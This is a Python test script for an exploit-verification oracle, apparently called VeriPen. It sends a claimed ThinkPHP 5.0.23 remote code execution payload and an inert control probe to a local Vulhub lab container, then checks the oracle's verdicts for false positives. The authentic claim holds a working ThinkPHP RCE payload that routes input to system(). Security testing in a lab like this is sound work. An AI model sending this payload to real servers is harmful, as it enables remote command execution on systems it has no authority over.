import asyncio
from rich.console import Console
from rich.panel import Panel

from veripen.core.schemas import (
    ExploitClaim,
    VulnerabilityType,
    InjectionPoint,
)
from veripen.oracles.canary_rce import CanaryRCEOracle

console = Console()

async def run_live_test():
    console.print(Panel(
        "[bold green]VeriPen Live Vulnerability Verification[/bold green]\n"
        "Target: Vulhub ThinkPHP 5.0.23 RCE (Docker Container: 5023-rce-web-1)"
    ))

    oracle = CanaryRCEOracle()

    # 1. Target Endpoint Verification
    authentic_claim = ExploitClaim(
        target_url="http://127.0.0.1:8080/index.php?s=captcha",
        vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
        injection_point=InjectionPoint.POST_BODY,
        parameter_name="_method",
        candidate_payload="__construct&filter[]=system&method=get&server[REQUEST_METHOD]=",
        http_method="POST",
        red_rationale="ThinkPHP 5.0.23 invocation bypass leading to system() command execution"
    )

    console.print("[cyan]1. Dispatching Invariant Probe against Live Container...[/cyan]")
    diagnostic = await oracle.verify(authentic_claim)
    console.print(f"Status: [bold]{diagnostic.status}[/bold]")
    console.print(f"Rejection Code: {diagnostic.rejection_code}")
    console.print(f"Observation: {diagnostic.raw_observation}")
    console.print(f"Recommended Action: {diagnostic.recommended_action}\n")

    # 2. Control Verification (Negative Reflection Check)
    console.print("[cyan]2. Dispatching Non-Executable Probe (Testing Hallucination Immunity)...[/cyan]")
    control_claim = ExploitClaim(
        target_url="http://127.0.0.1:8080/index.php?s=captcha",
        vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
        injection_point=InjectionPoint.POST_BODY,
        parameter_name="_method",
        candidate_payload="echo 'inert_probe'",
        http_method="POST",
        red_rationale="Non-payload input to confirm oracle does not produce false positives"
    )
    control_diagnostic = await oracle.verify(control_claim)
    console.print(f"Status: [bold]{control_diagnostic.status}[/bold]")
    console.print(f"Rejection Code: {control_diagnostic.rejection_code}")
    console.print(f"Observation: {control_diagnostic.raw_observation}")
    console.print(f"Recommended Action: {control_diagnostic.recommended_action}")

if __name__ == "__main__":
    asyncio.run(run_live_test())
